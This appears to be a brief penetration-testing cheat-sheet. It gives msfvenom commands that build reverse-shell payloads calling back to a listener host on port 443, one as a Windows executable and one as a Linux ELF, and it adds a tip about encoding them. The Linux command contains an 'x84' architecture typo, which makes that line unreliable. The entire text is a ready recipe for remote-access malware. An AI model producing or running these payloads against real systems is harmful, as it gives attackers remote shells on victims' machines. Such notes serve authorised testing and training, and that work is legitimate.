# For Windows
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.176 LPORT=443 EXITFUNC=thread -f exe > binary.exe

# For Debian x84 (Not x64)
msfvenom -p linux/x84/shell_reverse_tcp -f elf LHOST=123.123.123.123 LPORT=443 -o shell

# Keep in mind that you can encode the payloads